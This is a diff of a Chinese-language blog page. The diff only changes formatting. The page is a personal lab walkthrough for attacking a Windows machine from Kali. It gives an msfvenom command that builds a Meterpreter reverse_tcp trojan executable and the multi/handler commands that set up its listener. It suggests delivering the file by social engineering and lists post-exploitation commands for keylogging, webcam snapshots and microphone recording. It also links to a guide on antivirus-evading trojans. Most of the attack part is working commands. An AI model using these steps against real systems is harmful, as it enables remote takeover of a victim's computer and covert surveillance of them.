@@ -202,7 +202,7 @@
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>August 30, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1414</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1221</span>
     </div>
   </div>
 </section>
@@ -212,42 +212,42 @@
         <h4 id="8-30"><a href="#8-30" class="headerlink" title="8.30"></a>8.30</h4><p> 参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/k_love1219/article/details/104591110">记一次Kali系统渗透靶机(物理机)的详细过程（渗透必备）_k_love1219的博客-CSDN博客</a></p>
 <p>首先开启kali-2018</p>
-<p><img   class="lazyload" data-original="/2021/08/30/2021/src/0830/image-20210830165837896.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210830165837896</span></p>
+<p><img   class="lazyload" data-original="/2021/08/30/2021/src/0830/image-20210830165837896.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210830165837896"></p>
 <p>接着我们开始创建木马文件</p>
 <p>输入以下指令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;你的虚拟机ip地址 lport&#x3D;4444 -f exe -o &#x2F;root&#x2F;Desktop&#x2F;aaa.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp lhost=你的虚拟机ip地址 lport=<span class="hljs-number">4444</span> -f exe -o <span class="hljs-regexp">/root/</span>Desktop/aaa.exe<br></code></pre></td></tr></table></figure>
 
 <p>桌面会生成名为aaa.exe的木马文件</p>
-<p><img   class="lazyload" data-original="/2021/08/30/2021/src/0830/image-20210830170039670.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210830170039670</span></p>
+<p><img   class="lazyload" data-original="/2021/08/30/2021/src/0830/image-20210830170039670.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210830170039670"></p>
 <p>我们进入msfconsole</p>
-<p><img   class="lazyload" data-original="/2021/08/30/2021/src/0830/image-20210830170155242.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210830170155242</span></p>
+<p><img   class="lazyload" data-original="/2021/08/30/2021/src/0830/image-20210830170155242.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210830170155242"></p>
 <p>使用如下一系列指令：</p>
 <p>使用exploit/multi/handler</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/multi/</span>handler<br></code></pre></td></tr></table></figure>
 
 <p>设置payload </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br></code></pre></td></tr></table></figure>
 
 <p>设置木马监听回传ip地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 你的虚拟机的ip地址</span><br></pre></td></tr></table></figure>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> lhost 你的虚拟机的<span class="hljs-comment">ip</span>地址<br></code></pre></td></tr></table></figure>
 
 <p>设置木马监听回传端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 4444</span><br></pre></td></tr></table></figure>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">set</span> l<span class="hljs-keyword">port</span> 4444<br></code></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2021/08/30/2021/src/0830/image-20210830170532133.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210830170532133</span></p>
+<p><img   class="lazyload" data-original="/2021/08/30/2021/src/0830/image-20210830170532133.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210830170532133"></p>
 <p>还可以用 show options来确认是否设置成功</p>
 <p>这时候我们利用社会工程学的知识来将木马病毒送进靶机</p>
 <p>doge（可以设置放在物理机桌面上，然后点击运行即可，若不放心可自行前去任务管理器的详细信息查看是否有进程aaa.exe）</p>
-<p><img   class="lazyload" data-original="/2021/08/30/2021/src/0830/image-20210831085318058.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210831085318058</span></p>
+<p><img   class="lazyload" data-original="/2021/08/30/2021/src/0830/image-20210831085318058.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210831085318058"></p>
 <p>可以看到建立了session</p>
 <p>说明我们已经成功连上了靶机</p>
 <p>试着运行一些指令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sysinfo</span><br></code></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2021/08/30/2021/src/0830/image-20210831085740617.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210831085740617</span></p>
+<p><img   class="lazyload" data-original="/2021/08/30/2021/src/0830/image-20210831085740617.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210831085740617"></p>
 <p>查看了靶机的一些信息</p>
 <p>此外还有的命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getuid    获取系统ID以及计算机名称</span><br><span class="line">kill    中止进程</span><br><span class="line">ps    列举正在运行中的进程</span><br><span class="line">getpid    获取当前进程标识符</span><br><span class="line">keyscan_start     开启按键记录会话</span><br><span class="line">keyscan_stop     终止按键记录会话</span><br><span class="line">keyscan_dump   转储从被攻击主机捕获到的按键</span><br><span class="line">enumdesktops    列举所有可访问到的桌面和工作站</span><br><span class="line">getdesktop    获取当前meterpreter桌面</span><br><span class="line">setdesktop    变更meterpreter当前桌面</span><br><span class="line">webcam_list   列举系统中所有的摄像头</span><br><span class="line">webcam_snap   捕获被攻击主机的快照</span><br><span class="line">record_mic    从主机的默认麦克风中记录环境声音</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">getuid</span>    <span class="hljs-string">获取系统ID以及计算机名称</span><br><span class="hljs-attr">kill</span>    <span class="hljs-string">中止进程</span><br><span class="hljs-attr">ps</span>    <span class="hljs-string">列举正在运行中的进程</span><br><span class="hljs-attr">getpid</span>    <span class="hljs-string">获取当前进程标识符</span><br><span class="hljs-attr">keyscan_start</span>     <span class="hljs-string">开启按键记录会话</span><br><span class="hljs-attr">keyscan_stop</span>     <span class="hljs-string">终止按键记录会话</span><br><span class="hljs-attr">keyscan_dump</span>   <span class="hljs-string">转储从被攻击主机捕获到的按键</span><br><span class="hljs-attr">enumdesktops</span>    <span class="hljs-string">列举所有可访问到的桌面和工作站</span><br><span class="hljs-attr">getdesktop</span>    <span class="hljs-string">获取当前meterpreter桌面</span><br><span class="hljs-attr">setdesktop</span>    <span class="hljs-string">变更meterpreter当前桌面</span><br><span class="hljs-attr">webcam_list</span>   <span class="hljs-string">列举系统中所有的摄像头</span><br><span class="hljs-attr">webcam_snap</span>   <span class="hljs-string">捕获被攻击主机的快照</span><br><span class="hljs-attr">record_mic</span>    <span class="hljs-string">从主机的默认麦克风中记录环境声音</span><br><br></code></pre></td></tr></table></figure>
 
 <p>找到更为高级的免杀木马文章：</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/leeqizhi/p/13029755.html">MSF制作免杀木马 - 迷途小書童~ - 博客园 (cnblogs.com)</a></p>
